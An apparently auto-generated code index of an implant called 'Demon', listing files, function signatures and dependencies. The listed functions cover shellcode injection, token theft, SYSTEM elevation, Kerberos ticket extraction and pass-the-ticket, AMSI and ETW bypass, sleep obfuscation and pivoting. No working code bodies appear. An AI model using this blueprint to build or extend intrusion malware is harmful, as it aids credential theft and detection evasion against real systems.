# Subsystem: core

## payloads/Demon/src/core/CoffeeLdr.c
- Layer: utility
- Doc: __imp_ __imp_Beacon .refptr.Instance __imp__ __imp__Beacon _Instance
- Language: c
- Symbols:
  - `VehDebugger` (function, line 32) `LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )`
  - `SymbolIncludesLibrary` (function, line 64) `BOOL SymbolIncludesLibrary( LPSTR Symbol )`
  - `SymbolIsImport` (function, line 81) `BOOL SymbolIsImport( LPSTR Symbol )`
  - `CoffeeProcessSymbol` (function, line 87) `BOOL CoffeeProcessSymbol( PCOFFEE Coffee, LPSTR SymbolName, UINT16 SymbolType, PVOID* pFuncAddr )`
  - `CoffeeFunction` (function, line 242) `VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )`
  - `PUTS` (function, line 251) `PUTS( "Finished" )
}

BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument,...`
  - `CoffeeCleanup` (function, line 394) `VOID CoffeeCleanup( PCOFFEE Coffee )`
  - `CoffeeProcessSections` (function, line 423) `BOOL CoffeeProcessSections( PCOFFEE Coffee )`
  - `CoffeeGetFunMapSize` (function, line 602) `SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )`
  - `RemoveCoffeeFromInstance` (function, line 642) `VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )`
  - `PUTS` (function, line 669) `PUTS( "Coffe entry was not found" )
}

VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID A...`
  - `PRINTF` (function, line 678) `PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData,...`
  - `CoffeeRunnerThread` (function, line 799) `VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )`
  - `CoffeeRunner` (function, line 821) `VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize,...`
  - `COFF_PREP_SYMBOL` (macro, line 12) `#define COFF_PREP_SYMBOL`
  - `COFF_PREP_SYMBOL_SIZE` (macro, line 13) `#define COFF_PREP_SYMBOL_SIZE`
  - `COFF_PREP_BEACON` (macro, line 15) `#define COFF_PREP_BEACON`
  - `COFF_PREP_BEACON_SIZE` (macro, line 16) `#define COFF_PREP_BEACON_SIZE`
  - `COFF_INSTANCE` (macro, line 18) `#define COFF_INSTANCE`
  - `COFF_PREP_SYMBOL` (macro, line 21) `#define COFF_PREP_SYMBOL`
  - `COFF_PREP_SYMBOL_SIZE` (macro, line 22) `#define COFF_PREP_SYMBOL_SIZE`
  - `COFF_PREP_BEACON` (macro, line 24) `#define COFF_PREP_BEACON`
  - `COFF_PREP_BEACON_SIZE` (macro, line 25) `#define COFF_PREP_BEACON_SIZE`
  - `COFF_INSTANCE` (macro, line 27) `#define COFF_INSTANCE`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/CoffeeLdr.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/ObjectApi.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/Win32.h`, `payloads/Demon/include/inject/InjectUtil.h`

## payloads/Demon/src/core/Command.c
- Layer: utility
- Language: c
- Symbols:
  - `CommandDispatcher` (function, line 48) `VOID CommandDispatcher( VOID )`
  - `PRINTF` (function, line 107) `PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, Requ...`
  - `PUTS` (function, line 160) `PUTS( "Out of while loop" )
}

VOID CommandCheckin( PPARSER Parser )`
  - `CommandSleep` (function, line 174) `VOID CommandSleep( PPARSER Parser )`
  - `CommandJob` (function, line 188) `VOID CommandJob( PPARSER Parser )`
  - `CommandProc` (function, line 263) `VOID CommandProc( PPARSER Parser )`
  - `PUTS` (function, line 272) `case DEMON_COMMAND_PROC_MODULES: PUTS( "Proc::Modules" )`
  - `PUTS` (function, line 337) `case DEMON_COMMAND_PROC_GREP: PUTS("Proc::Grep")`
  - `PUTS` (function, line 423) `case DEMON_COMMAND_PROC_CREATE: PUTS( "Proc::Create" )`
  - `PUTS` (function, line 468) `case DEMON_COMMAND_PROC_MEMORY: PUTS( "Proc::Memory" )`
  - `PUTS` (function, line 528) `case DEMON_COMMAND_PROC_KILL: PUTS( "Proc::Kill" )`
  - `CommandProcList` (function, line 562) `VOID CommandProcList(
    IN PPARSER Parser
)`
  - `PACKAGE_ERROR_NTSTATUS` (function, line 671) `PACKAGE_ERROR_NTSTATUS( NtStatus )
    }
}

VOID CommandFS( PPARSER Parser )`
  - `PUTS` (function, line 684) `case DEMON_COMMAND_FS_DIR: PUTS( "FS::Dir" )`
  - `PUTS` (function, line 794) `case DEMON_COMMAND_FS_DOWNLOAD: PUTS( "FS::Download" )`
  - `PRINTF` (function, line 824) `PRINTF( "FilePath.Buffer[%d]: %ls\n", PathSize, FilePath )

            if ( ! Instance->Win32.Ge...`
  - `PUTS` (function, line 867) `CleanupDownload:
            PUTS( "CleanupDownload" )

            if ( FileName.Buffer )`
  - `PUTS` (function, line 882) `case DEMON_COMMAND_FS_UPLOAD: PUTS( "FS::Upload" )`
  - `PUTS` (function, line 949) `case DEMON_COMMAND_FS_CD: PUTS( "FS::Cd" )`
  - `PUTS` (function, line 964) `case DEMON_COMMAND_FS_REMOVE: PUTS( "FS::Remove" )`
  - `PUTS` (function, line 994) `case DEMON_COMMAND_FS_MKDIR: PUTS( "FS::Mkdir" )`
  - `PUTS` (function, line 1010) `case DEMON_COMMAND_FS_COPY: PUTS( "FS::Copy" )`
  - `PUTS` (function, line 1035) `case DEMON_COMMAND_FS_MOVE: PUTS( "FS::Move" )`
  - `PUTS` (function, line 1060) `case DEMON_COMMAND_FS_GET_PWD: PUTS( "FS::GetPwd" )`
  - `PUTS` (function, line 1075) `case DEMON_COMMAND_FS_CAT: PUTS( "FS::Cat" )`
  - `CommandInlineExecute` (function, line 1114) `VOID CommandInlineExecute( PPARSER Parser )`
  - `PUTS` (function, line 1181) `PUTS( "Use default (from config) CoffeeLdr" )

            if ( Instance->Config.Implant.CoffeeTh...`
  - `CommandInjectDLL` (function, line 1203) `VOID CommandInjectDLL( PPARSER Parser )`
  - `CommandSpawnDLL` (function, line 1247) `VOID CommandSpawnDLL( PPARSER Parser )`
  - `CommandInjectShellcode` (function, line 1266) `VOID CommandInjectShellcode(
    IN PPARSER Parser
)`
  - `PRINTF` (function, line 1293) `PRINTF(
        "Injection Args:      \n"
        " - Way     : %d      \n"
        " - Method  :...`
  - `PUTS` (function, line 1312) `case INJECT_WAY_SPAWN: PUTS( "INJECT_WAY_SPAWN" )`
  - `PRINTF` (function, line 1320) `PRINTF( "Target spawn process: %ls\n", Spawn )

            /* create process */
            if (...`
  - `PUTS` (function, line 1353) `case INJECT_WAY_INJECT: PUTS( "INJECT_WAY_INJECT" )`
  - `PUTS` (function, line 1358) `case INJECT_WAY_EXECUTE: PUTS( "INJECT_WAY_EXECUTE" )`
  - `CommandToken` (function, line 1373) `VOID CommandToken( PPARSER Parser )`
  - `PUTS` (function, line 1383) `case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )`
  - `PUTS` (function, line 1406) `case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )`
  - `PUTS` (function, line 1450) `case DEMON_COMMAND_TOKEN_LIST: PUTS( "Token::List" )`
  - `PUTS` (function, line 1477) `case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )`
  - `PUTS` (function, line 1532) `case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )`
  - `PUTS` (function, line 1595) `case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )`
  - `PUTS` (function, line 1635) `case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )`
  - `PUTS` (function, line 1650) `case DEMON_COMMAND_TOKEN_REMOVE: PUTS( "Token::Remove" )`
  - `PUTS` (function, line 1660) `case DEMON_COMMAND_TOKEN_CLEAR: PUTS( "Token::Clear" )`
  - `PUTS` (function, line 1668) `case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::Find" )`
  - `CommandAssemblyInlineExecute` (function, line 1708) `VOID CommandAssemblyInlineExecute( PPARSER Parser )`
  - `PRINTF` (function, line 1761) `PRINTF(
            "Parsed Arguments:         \n"
            " - PipeName     [%d]: %ls \n"
   ...`
  - `PUTS` (function, line 1788) `PUTS( "Dotnet instance already running." )
    }
}

VOID CommandAssemblyListVersion( PPARSER Pars...`
  - `PUTS` (function, line 1841) `else
        PUTS("Failed to load mscoree.dll")


    if ( pClrMetaHost )`
  - `CommandConfig` (function, line 1865) `VOID CommandConfig( PPARSER Parser )`
  - `CommandScreenshot` (function, line 2084) `VOID CommandScreenshot( PPARSER Parser )`
  - `CommandNet` (function, line 2109) `VOID CommandNet( PPARSER Parser )`
  - `PUTS` (function, line 2350) `PUTS( "NetLocalGroupEnum => Success" )
                if ( GroupInfo )`
  - `CommandPivot` (function, line 2463) `VOID CommandPivot( PPARSER Parser )`
  - `CommandTransfer` (function, line 2608) `VOID CommandTransfer( PPARSER Parser )`
  - `PUTS` (function, line 2624) `case DEMON_COMMAND_TRANSFER_LIST: PUTS( "Transfer::list" )`
  - `PUTS` (function, line 2641) `case DEMON_COMMAND_TRANSFER_STOP: PUTS( "Transfer::stop" )`
  - `PUTS` (function, line 2668) `case DEMON_COMMAND_TRANSFER_RESUME: PUTS( "Transfer::resume" )`
  - `PUTS` (function, line 2696) `case DEMON_COMMAND_TRANSFER_REMOVE: PUTS( "Transfer::remove" )`
  - `CommandSocket` (function, line 2739) `VOID CommandSocket( PPARSER Parser )`
  - `PUTS` (function, line 2751) `case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )`
  - `PUTS` (function, line 2786) `case SOCKET_COMMAND_RPORTFWD_LIST: PUTS( "Socket::RPortFwdList" )`
  - `PUTS` (function, line 2819) `case SOCKET_COMMAND_RPORTFWD_REMOVE: PUTS( "Socket::RPortFwdRemove" )`
  - `PUTS` (function, line 2850) `case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )`
  - `PUTS` (function, line 2871) `case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )`
  - `PUTS` (function, line 2878) `case SOCKET_COMMAND_WRITE: PUTS( "Socket::Write" )`
  - `PUTS` (function, line 2942) `case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )`
  - `PRINTF` (function, line 2997) `PRINTF( "Socket ID: %x\n", ScId )

            /* check if address is not 0 */
            if ( I...`
  - `PUTS` (function, line 3036) `case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )`
  - `CommandKerberos` (function, line 3077) `VOID CommandKerberos(
    IN PPARSER Parser
)`
  - `PUTS` (function, line 3090) `case KERBEROS_COMMAND_LUID: PUTS("Kerberos::LUID")`
  - `PUTS` (function, line 3117) `case KERBEROS_COMMAND_KLIST: PUTS("Kerberos::Klist")`
  - `PUTS` (function, line 3205) `case KERBEROS_COMMAND_PURGE: PUTS("Kerberos::Purge")`
  - `PUTS` (function, line 3216) `case KERBEROS_COMMAND_PTT: PUTS("Kerberos::Ptt")`
  - `CommandMemFile` (function, line 3237) `VOID CommandMemFile( PPARSER Parser )`
  - `InWorkingHours` (function, line 3263) `BOOL InWorkingHours( )`
  - `ReachedKillDate` (function, line 3295) `BOOL ReachedKillDate()`
  - `KillDate` (function, line 3300) `VOID KillDate( )`
  - `CommandExit` (function, line 3315) `VOID CommandExit( PPARSER Parser )`
  - `Data` (function, line 844) `* * Data (Open): * [ File Size ] * [ File Name ] * * Data (Write) * [ Chunk Data ] Size + FileChunk * * Data (Close): * [ Reason ] Removed or Finished * */ /* Download Header */ PackageAddInt32( Packa`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/CoffeeLdr.h`, `payloads/Demon/include/core/Command.h`, `payloads/Demon/include/core/Dotnet.h`, `payloads/Demon/include/core/Download.h`, `payloads/Demon/include/core/Kerberos.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Package.h`, `payloads/Demon/include/core/SleepObf.h`, `payloads/Demon/include/core/Token.h`, `payloads/Demon/include/inject/Inject.h`

## payloads/Demon/src/core/Dotnet.c
- Layer: utility
- Language: c
- Symbols:
  - `DotnetExecute` (function, line 19) `BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )`
  - `PUTS` (function, line 101) `PUTS( "Init HwBp Engine" )
        /* use global engine */
        if ( ! NT_SUCCESS( HwBpEngineI...`
  - `PUTS` (function, line 112) `PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
            if ( ! NT_SUCCESS( Status = HwBpEngin...`
  - `PUTS` (function, line 120) `PUTS( "HwBp Engine add NtTraceEvent bypass" )
        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, Thr...`
  - `PUTS` (function, line 148) `PUTS( "CreateDomain..." )
    if ( ( Result = Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDo...`
  - `PUTS` (function, line 154) `PUTS( "QueryInterface..." )
    if ( ( Result = Instance->Dotnet->AppDomainThunk->lpVtbl->QueryIn...`
  - `PRINTF` (function, line 169) `PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
        PACKAGE_ERROR_WIN32
    }

    PUTS...`
  - `PUTS` (function, line 179) `PUTS( "Assembly EntryPoint..." )
    if ( ( Result = Instance->Dotnet->Assembly->lpVtbl->EntryPoi...`
  - `PUTS` (function, line 237) `PUTS( "Creating events..." )
    if ( NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotne...`
  - `PUTS` (function, line 286) `PUTS( "Resume Thread..." )
                if ( NT_SUCCESS( Instance->Win32.NtAlertResumeThread( ...`
  - `DotnetPushPipe` (function, line 312) `VOID DotnetPushPipe()`
  - `DotnetPush` (function, line 347) `VOID DotnetPush()`
  - `PRINTF` (function, line 352) `PRINTF( "Instance->Dotnet->Invoked: %s\n", Instance->Dotnet->Invoked ? "TRUE" : "FALSE" )
    if ...`
  - `DotnetClose` (function, line 379) `VOID DotnetClose()`
  - `PUTS` (function, line 428) `PUTS( "Free Output" )
    if ( Instance->Dotnet->Output.Buffer )`
  - `PUTS` (function, line 436) `PUTS( "Unload and free CLR" )
    if ( Instance->Dotnet->MethodArgs )`
  - `FindVersion` (function, line 501) `BOOL FindVersion( PVOID Assembly, DWORD length )`
  - `ClrCreateInstance` (function, line 524) `DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *p...`
  - `PIPE_BUFFER` (macro, line 8) `#define PIPE_BUFFER`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Dotnet.h`, `payloads/Demon/include/core/HwBpExceptions.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Runtime.h`

## payloads/Demon/src/core/Download.c
- Layer: utility
- Doc: Add file to linked list with type (upload/download)
- Language: c
- Symbols:
  - `DownloadAdd` (function, line 6) `PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, LONGLONG MaxSize )`
  - `DownloadGet` (function, line 27) `PDOWNLOAD_DATA DownloadGet( DWORD FileID )`
  - `DownloadFree` (function, line 41) `VOID DownloadFree( PDOWNLOAD_DATA Download )`
  - `DownloadRemove` (function, line 56) `BOOL DownloadRemove( DWORD FileID )`
  - `DownloadPush` (function, line 94) `VOID DownloadPush()`
  - `PRINTF` (function, line 129) `PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", Instance->DownloadChunk.Bu...`
  - `MemFileIsNew` (function, line 238) `BOOL MemFileIsNew( ULONG32 ID )`
  - `NewMemFile` (function, line 254) `PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )`
  - `GetMemFile` (function, line 287) `PMEM_FILE GetMemFile( ULONG32 ID )`
  - `ProcessMemFileChunk` (function, line 302) `PMEM_FILE ProcessMemFileChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )`
  - `MemFileReadChunk` (function, line 318) `PMEM_FILE MemFileReadChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize )`
  - `MemFileFree` (function, line 339) `VOID MemFileFree( PMEM_FILE MemFile )`
  - `RemoveMemFile` (function, line 355) `BOOL RemoveMemFile( ULONG32 ID )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/HwBpEngine.c
- Layer: utility
- Language: c
- Symbols:
  - `HwBpEngineInit` (function, line 18) `NTSTATUS HwBpEngineInit(
    OUT PHWBP_ENGINE Engine,
    IN  PVOID        Handler
)`
  - `HwBpEngineSetBp` (function, line 61) `NTSTATUS HwBpEngineSetBp(
    IN DWORD Tid,
    IN PVOID Address,
    IN BYTE  Position,
    IN B...`
  - `PRINTF` (function, line 116) `PRINTF(
                "Dr Registers:  \n"
                "- Dr0[%d]: %p  \n"
                "...`
  - `HwBpEngineAdd` (function, line 152) `NTSTATUS HwBpEngineAdd(
    IN PHWBP_ENGINE Engine,
    IN DWORD        Tid,
    IN PVOID        ...`
  - `PRINTF` (function, line 162) `PRINTF( "Engine:[%p] Tid:[%d] Address:[%p] Function:[%p] Position:[%d]\n", Engine, Tid, Address, ...`
  - `HwBpEngineRemove` (function, line 209) `NTSTATUS HwBpEngineRemove(
    IN PHWBP_ENGINE Engine,
    IN DWORD        Tid,
    IN PVOID     ...`
  - `HwBpEngineDestroy` (function, line 261) `NTSTATUS HwBpEngineDestroy(
    IN PHWBP_ENGINE Engine
)`
  - `ExceptionHandler` (function, line 320) `LONG ExceptionHandler(
    _Inout_ PEXCEPTION_POINTERS Exception
)`
  - `PRINTF` (function, line 355) `PRINTF( "Found exception handler: %s\n", Found ? "TRUE" : "FALSE" )
        if ( Found )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/HwBpEngine.h`, `payloads/Demon/include/core/HwBpExceptions.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/SysNative.h`

## payloads/Demon/src/core/HwBpExceptions.c
- Layer: utility
- Language: c
- Symbols:
  - `HwBpExAmsiScanBuffer` (function, line 6) `VOID HwBpExAmsiScanBuffer(
    _Inout_ PEXCEPTION_POINTERS Exception
)`
  - `HwBpExNtTraceEvent` (function, line 23) `VOID HwBpExNtTraceEvent(
    _Inout_ PEXCEPTION_POINTERS Exception
)`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/HwBpExceptions.h`

## payloads/Demon/src/core/Jobs.c
- Layer: utility
- Doc: !
- Language: c
- Symbols:
  - `JobAdd` (function, line 17) `VOID JobAdd( UINT32 RequestID, DWORD JobID, SHORT Type, SHORT State, HANDLE Handle, PVOID Data )`
  - `JobCheckList` (function, line 63) `VOID JobCheckList()`
  - `JobSuspend` (function, line 184) `BOOL JobSuspend( DWORD JobID )`
  - `PRINTF` (function, line 192) `PRINTF( "Found Job ID: %d", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )`
  - `JobResume` (function, line 230) `BOOL JobResume( DWORD JobID )`
  - `PRINTF` (function, line 238) `PRINTF( "Found Job ID: %d", JobID )

            if ( JobList->Type == JOB_TYPE_THREAD )`
  - `JobKill` (function, line 277) `BOOL JobKill( DWORD JobID )`
  - `PRINTF` (function, line 287) `PRINTF( "Found Job ID: %d\n", JobID )

            switch ( JobList->Type )`
  - `PUTS` (function, line 300) `PUTS( "Kill using handle" )

                            if ( ! NT_SUCCESS( NtStatus = Instance->...`
  - `JobRemove` (function, line 383) `VOID JobRemove( DWORD JobID )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Jobs.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/ObjectApi.h`, `payloads/Demon/include/core/Package.h`

## payloads/Demon/src/core/Kerberos.c
- Layer: utility
- Language: c
- Symbols:
  - `IsHighIntegrity` (function, line 8) `BOOL IsHighIntegrity(HANDLE TokenHandle)`
  - `GetProcessIdByName` (function, line 29) `DWORD GetProcessIdByName(WCHAR* processName)`
  - `ElevateToSystem` (function, line 61) `BOOL ElevateToSystem()`
  - `IsSystem` (function, line 131) `BOOL IsSystem( HANDLE TokenHandle )`
  - `GetLsaHandle` (function, line 155) `NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )`
  - `GetLogonSessionData` (function, line 218) `NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )`
  - `ExtractTicket` (function, line 283) `VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR*...`
  - `CopySessionInfo` (function, line 337) `VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )`
  - `CopyTicketInfo` (function, line 371) `VOID CopyTicketInfo( PTICKET_INFORMATION TicketInfo, PKERB_TICKET_CACHE_INFO_EX Data )`
  - `Ptt` (function, line 399) `BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )`
  - `Purge` (function, line 494) `BOOL Purge( HANDLE hToken, LUID luid )`
  - `Klist` (function, line 585) `PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )`
  - `GetLUID` (function, line 752) `LUID* GetLUID( HANDLE hToken )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Kerberos.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/Token.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/Memory.c
- Layer: utility
- Doc: !
- Language: c
- Symbols:
  - `MmHeapAlloc` (function, line 15) `PVOID MmHeapAlloc(
    _In_ ULONG Length
)`
  - `MmHeapReAlloc` (function, line 31) `PVOID MmHeapReAlloc(
    _In_ PVOID Memory,
    _In_ ULONG Length
)`
  - `MmHeapFree` (function, line 48) `BOOL MmHeapFree(
    _In_ PVOID Memory
)`
  - `MmVirtualAlloc` (function, line 62) `PVOID MmVirtualAlloc(
    IN DX_MEMORY Methode,
    IN HANDLE    Process,
    IN SIZE_T    Size,
...`
  - `PUTS` (function, line 79) `case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" )`
  - `MmVirtualProtect` (function, line 133) `BOOL MmVirtualProtect(
    IN DX_MEMORY Method,
    IN HANDLE    Process,
    IN PVOID     Memory...`
  - `PUTS` (function, line 147) `case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" )`
  - `MmVirtualWrite` (function, line 189) `BOOL MmVirtualWrite(
    IN  HANDLE Process,
    OUT PVOID  Memory,
    IN  PVOID  Buffer,
    IN...`
  - `MmVirtualFree` (function, line 209) `BOOL MmVirtualFree(
    IN HANDLE Process,
    IN PVOID  Memory
)`
  - `MmGadgetFind` (function, line 240) `PVOID MmGadgetFind(
    _In_ PVOID  Memory,
    _In_ SIZE_T Length,
    _In_ PVOID  PatternBuffer...`
  - `FreeReflectiveLoader` (function, line 269) `BOOL FreeReflectiveLoader(
    IN PVOID BaseAddress
)`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/Memory.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/MiniStd.c
- Layer: utility
- Language: c
- Symbols:
  - `StringCompareA` (function, line 9) `INT StringCompareA( LPCSTR String1, LPCSTR String2 )`
  - `StringCompareW` (function, line 21) `INT StringCompareW( LPWSTR String1, LPWSTR String2 )`
  - `StringNCompareW` (function, line 33) `INT StringNCompareW( LPWSTR String1, LPWSTR String2, INT Length )`
  - `ToLowerCaseW` (function, line 48) `WCHAR ToLowerCaseW( WCHAR C )`
  - `StringCompareIW` (function, line 53) `INT StringCompareIW( LPWSTR String1, LPWSTR String2 )`
  - `StringNCompareIW` (function, line 65) `INT StringNCompareIW( LPWSTR String1, LPWSTR String2, INT Length )`
  - `EndsWithIW` (function, line 80) `BOOL EndsWithIW( LPWSTR String, LPWSTR Ending )`
  - `HashStringA` (function, line 100) `DWORD HashStringA( PCHAR String )`
  - `StringCopyA` (function, line 112) `PCHAR StringCopyA(PCHAR String1, PCHAR String2)`
  - `StringCopyW` (function, line 121) `PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)`
  - `StringLengthA` (function, line 130) `SIZE_T StringLengthA(LPCSTR String)`
  - `StringLengthW` (function, line 142) `SIZE_T StringLengthW(LPCWSTR String)`
  - `StringConcatA` (function, line 151) `PCHAR StringConcatA(PCHAR String, PCHAR String2)`
  - `StringConcatW` (function, line 158) `PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)`
  - `WcsStr` (function, line 165) `LPWSTR WcsStr( PWCHAR String, PWCHAR String2 )`
  - `WcsIStr` (function, line 185) `LPWSTR WcsIStr( PWCHAR String, PWCHAR String2 )`
  - `MemCompare` (function, line 205) `INT MemCompare( PVOID s1, PVOID s2, INT len)`
  - `WCharStringToCharString` (function, line 229) `SIZE_T WCharStringToCharString(PCHAR Destination, PWCHAR Source, SIZE_T MaximumAllowed)`
  - `CharStringToWCharString` (function, line 242) `SIZE_T CharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed )`
  - `StringTokenA` (function, line 255) `PCHAR StringTokenA(PCHAR String, CONST PCHAR Delim)`
  - `GetSystemFileTime` (function, line 300) `UINT64 GetSystemFileTime( )`
  - `HideChar` (function, line 313) `BYTE NO_INLINE HideChar( BYTE C )`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/core/MiniStd.h`

## payloads/Demon/src/core/Obf.c
- Layer: utility
- Doc: !
- Language: c
- Symbols:
  - `FoliageObf` (function, line 22) `VOID FoliageObf(
    IN PSLEEP_PARAM Param
)`
  - `PRINTF` (function, line 603) `PRINTF( "RtlCreateTimerQueue/NtCreateEvent Failed: %lx\n", NtStatus )
    }

LEAVE: /* cleanup */...`
  - `SleepTime` (function, line 650) `UINT32 SleepTime(
    VOID
)`
  - `SleepObf` (function, line 714) `VOID SleepObf(
    VOID
)`
- Depends on: `payloads/Demon/include/Demon.h`, `payloads/Demon/include/common/Macros.h`, `payloads/Demon/include/core/MiniStd.h`, `payloads/Demon/include/core/SleepObf.h`, `payloads/Demon/include/core/Thread.h`, `payloads/Demon/include/core/Win32.h`

## payloads/Demon/src/core/ObjectApi.c
- Layer: presentation
- Doc: Meh some wrapper functions for internal demon GetProcAddress and GetModuleHandleA functions.
- Language: c
- Symbols:
  - `LdrModulePebString` (function, line 20) `PVOID LdrModulePebString( PCHAR ModuleString )`
  - `LdrFunctionAddrString` (function, line 26) `PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )`
  - `LdrFreeLibrary` (function, line 32) `BOOL LdrFreeLibrary( HMODULE hLibModule )`
  - `LdrLocalFree` (function, line 37) `HLOCAL LdrLocalFree( PVOID hMem )`
  - `swap_endianess` (function, line 131) `uint32_t swap_endianess(uint32_t indata)`
  - `BeaconDataParse` (function, line 143) `VOID BeaconDataParse( PDATA parser, PCHAR buffer, INT size )`
  - `BeaconDataInt` (function, line 155) `INT BeaconDataInt( PDATA parser )`
  - `BeaconDataShort` (function, line 170) `SHORT BeaconDataShort( datap* parser )`
  - `BeaconDataLength` (function, line 185) `INT BeaconDataLength( PDATA parser )`
  - `BeaconDataExtract` (function, line 190) `PCHAR BeaconDataExtract( PDATA parser, PINT size )`
  - `GetRequestIDForCallingObjectFile` (function, line 224) `BOOL GetRequestIDForCallingObjectFile( PVOID CoffeeFunctionReturn, PUINT32 RequestID )`
  - `BeaconPrintf` (function, line 248) `VOID BeaconPrintf( INT Type, PCHAR fmt, ... )`
  - `BeaconOutput` (function, line 305) `VOID BeaconOutput( INT Type, PCHAR data, INT len )`
  - `BeaconIsAdmin` (function, line 324) `BOOL BeaconIsAdmin(
    VOID
)`
  - `BeaconFormatAlloc` (function, line 343) `VOID BeaconFormatAlloc( PFORMAT format, int maxsz )`
  - `BeaconFormatReset` (function, line 354) `VOID BeaconFormatReset( PFORMAT format )`
  - `BeaconFormatFree` (function, line 361) `VOID BeaconFormatFree( PFORMAT format )`
  - `BeaconFormatAppend` (function, line 377) `VOID BeaconFormatAppend( PFORMAT format, char* text, int len )`
  - `BeaconFormatPrintf` (function, line 384) `VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )`
  - `BeaconFormatToString` (function, line 405) `char* BeaconFormatToString( PFORMAT format, int* size)`
  - `BeaconFormatInt` (function, line 411) `VOID BeaconFormatInt( PFORMAT format, int value)`
  - `BeaconUseToken` (function, line 425) `BOOL BeaconUseToken( HANDLE token )`
  - `BeaconGetSpawnTo` (function, line 440) `VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )`
  - `BeaconSpawnTemporaryProcess` (function, line 463) `BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo, PROCESS_INFORMA...`
  - `BeaconInjectProcess` (function, line 487) `VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char * a...`
  - `BeaconInjectTemporaryProcess` (function, line 530) `VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_of...`
  - `BeaconCleanupProcess` (function, line 564) `VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )`
  - `BeaconInformation` (function, line 578) `VOID BeaconInformation(BEACON_INFO * info)`
